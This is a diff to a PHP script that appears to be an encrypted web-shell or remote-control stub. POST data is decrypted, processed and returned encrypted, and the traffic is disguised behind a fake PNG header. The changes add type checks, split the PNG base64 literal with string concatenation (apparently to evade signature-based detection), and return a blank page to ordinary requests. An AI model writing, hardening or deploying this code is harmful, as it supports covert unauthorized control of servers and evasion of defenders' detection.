@@ -6,11 +6,12 @@
 function Decrypt($data) {
     if (!function_exists('openssl_decrypt')) return "";
     
-    $prefixLen = 68; 
-    $dataLen = strlen($data);
-    if ($dataLen <= ($prefixLen + 48)) return "";
+
+    if (!is_string($data) || strlen($data) <= 116) return ""; 
     
+    $prefixLen = 68; 
     $encrypted = substr($data, $prefixLen);
+    if (!is_string($encrypted)) return "";
     $encLen = strlen($encrypted);
     
     $key = "__KEY__"; 
@@ -31,16 +32,21 @@ function Decrypt($data) {
     if ($bodyLen <= 0) return "";
     $body = substr($encrypted, 16, $bodyLen);
     
+    if (!is_string($iv) || !is_string($tag) || !is_string($body)) return "";
+    
 
     $macData = $iv . $body;
     $check = hash_hmac('sha256', $macData, $aesKey, true);
     if (!hash_equals($check, $tag)) return ""; 
     
-    return openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
+    $decrypted = openssl_decrypt($body, 'AES-128-CBC', $aesKey, OPENSSL_RAW_DATA, $iv);
+    return is_string($decrypted) ? $decrypted : "";
 }
 
 function Encrypt($data) {
     if (!function_exists('openssl_encrypt')) return $data;
+    if (!is_string($data)) return "";
+    
     $key = "__KEY__"; 
     $raw = unpack('C*', $key);
     $raw = $raw ? array_values($raw) : [];
@@ -58,7 +64,8 @@ function Encrypt($data) {
     $macData = $ivStr . $enc;
     $tag = hash_hmac('sha256', $macData, $aesKey, true);
     
-    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=");
+
+    $prefix = base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk" . "+" . "A8AAQUBAScY42YAAAAASUVORK5CYII=");
     return $prefix . $ivStr . $enc . $tag;
 }
 
@@ -78,5 +85,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             echo Encrypt($output);
         }
     }
+} else {
+
+    echo "";
 }
 ?>
